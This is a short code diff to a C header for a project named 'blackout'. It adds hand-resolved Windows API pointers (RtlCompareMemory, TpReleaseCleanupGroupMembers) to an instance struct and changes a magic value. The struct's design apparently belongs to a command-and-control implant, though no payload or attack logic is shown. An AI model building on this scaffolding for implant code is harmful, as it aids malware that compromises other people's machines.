@@ -19,8 +19,7 @@
 #include <transport.h>
 
 #define BLACKOUT_COMMAND_LENGTH 10
-#define BLACKOUT_MAGIC_VALUE ( UINT32 ) 'taln'
-
+#define BLACKOUT_MAGIC_VALUE    0x6F626C76
 //
 // blackout instances
 //
@@ -103,7 +102,7 @@ typedef struct _INSTANCE {
         BOOL    (WINAPI *TerminateThread)(HANDLE hThread, DWORD dwExitCode);
         DWORD   (WINAPI *GetMappedFileNameA)( HANDLE hProcess, LPVOID lpv, LPSTR lpFilename, DWORD nSize);        
         BOOL    (WINAPI *SetFileInformationByHandle)( HANDLE hFile, FILE_INFO_BY_HANDLE_CLASS FileInformationClass, LPVOID lpFileInformation, DWORD dwBufferSize );
-        
+        SIZE_T   (NTAPI *RtlCompareMemory)(const void *Source1, const void *Source2, SIZE_T Length);
         VOID     (NTAPI *RtlZeroMemory)(PVOID Destination, UINT64 Length);
         VOID     (NTAPI *RtlCopyMemory)(PVOID Destination, PVOID Source, UINT64 Length);
         void     (NTAPI *RtlExitUserProcess)(NTSTATUS ExitStatus);
@@ -177,6 +176,8 @@ typedef struct _INSTANCE {
         BOOL      (*WinHttpCloseHandle)(HINTERNET hInternet);
 
         D_API( printf );
+
+        PVOID TpReleaseCleanupGroupMembers;
 
         ULONG (*GetAdaptersInfo)( PIP_ADAPTER_INFO AdapterInfo, PULONG SizePointer );
     } Win32;
